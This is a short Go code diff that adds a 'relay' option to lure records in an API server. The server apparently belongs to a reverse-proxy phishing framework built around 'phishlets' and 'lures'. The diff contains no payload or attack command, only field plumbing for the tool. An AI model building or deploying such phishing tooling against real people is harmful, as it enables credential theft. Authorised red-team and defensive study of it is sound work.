@@ -444,7 +444,7 @@ func (a *apiServer) handleLures(w http.ResponseWriter, r *http.Request) {
 		out = append(out, map[string]interface{}{
 			"id": i, "phishlet": l.Phishlet, "path": l.Path,
 			"hostname": l.Hostname, "redirect_url": l.RedirectUrl,
-			"token": l.Token,
+			"token": l.Token, "relay": l.Relay,
 			"paused": l.PausedUntil != 0,
 		})
 		}
@@ -461,6 +461,7 @@ func (a *apiServer) handleLures(w http.ResponseWriter, r *http.Request) {
 		Path        string `json:"path"`
 		RedirectUrl string `json:"redirect_url"`
 		Token       string `json:"token"`
+		Relay       bool   `json:"relay"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Phishlet == "" {
 		http.Error(w, `{"error":"body must be {\"phishlet\": \"...\", ...}"}`, http.StatusBadRequest)
@@ -474,6 +475,7 @@ func (a *apiServer) handleLures(w http.ResponseWriter, r *http.Request) {
 		Phishlet:    req.Phishlet,
 		Path:        req.Path,
 		RedirectUrl: req.RedirectUrl,
+		Relay:       req.Relay,
 	}
 	switch req.Token {
 	case "":
